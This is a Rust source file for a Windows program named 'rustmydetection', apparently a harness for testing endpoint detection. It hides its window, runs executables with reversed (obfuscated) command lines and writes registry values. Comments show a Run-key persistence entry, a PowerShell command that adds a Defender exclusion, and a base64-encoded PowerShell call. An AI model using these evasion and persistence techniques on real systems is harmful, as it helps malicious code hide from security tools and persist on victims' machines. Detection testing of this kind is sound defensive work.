#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]

mod upload;
mod escape;


use std::env;
use std::path::PathBuf;
use std::process::Command;

extern crate winreg;
use winreg::HKEY;
use winreg::RegKey;
use winreg::enums::*;

use std::fs::File;
use std::io::Write;



use std::io::Read;
use std::string::String;

mod tools {

    use winreg::RegKey;
    use winreg::HKEY;
    use std::process::Command;

    /*
    Execute an executable with a commandline
    */
    pub fn run_exe(executable: &str,commandline: &str) {
        let mut child = Command::new(executable)
            .args([commandline])
            .spawn()
            .expect("failed to execute process");
        let _ecode = child.wait().expect("failed to wait on child");
    }

    /*
    Execute an executable with a reverse commandline 
    */
    pub fn run_exe_reverse(executable: &str,commandline: &str) {
        let commandline_reversed: String = commandline.chars().rev().collect();
        let mut child = Command::new(executable)
            .args([commandline_reversed])
            .spawn()
            .expect("failed to execute process");
        let _ecode = child.wait().expect("failed to wait on child");
    }
    
    /* learn how use generic type for value */
    pub fn set_reg_str(root: HKEY, regpath: &str,name: &str, value: &str){
        let base = winreg::RegKey::predef(root);
        let rootkey = base.create_subkey(regpath);
        match rootkey{
            Ok(subkey) => {
                let _set_result = subkey.0.set_value(name, &value);
            },
            Err(_) => return(),
        }
   }
   pub fn set_reg_u32(root: HKEY, regpath: &str,name: &str, value: u32){
    let base = winreg::RegKey::predef(root);
    let rootkey = base.create_subkey(regpath);
    match rootkey{
        Ok(subkey) => {
            let _set_result = subkey.0.set_value(name, &value);
        },
        Err(_) => return(),
    }
}




}

   /* tools::set_reg_str(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "rustmydetection",
        "\"c:\\git\\rustmydetection.exe\"");
    */ 
    //"powershell" -Command Add-MpPreference -ExclusionPath 'C:\ProgramData' 
    //ps_enc("cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAALQBzAGUAYwBvAG4AZABzACAAMgAwAA=="); //wait 20
    



fn main() {
    escape::jump_man();

}
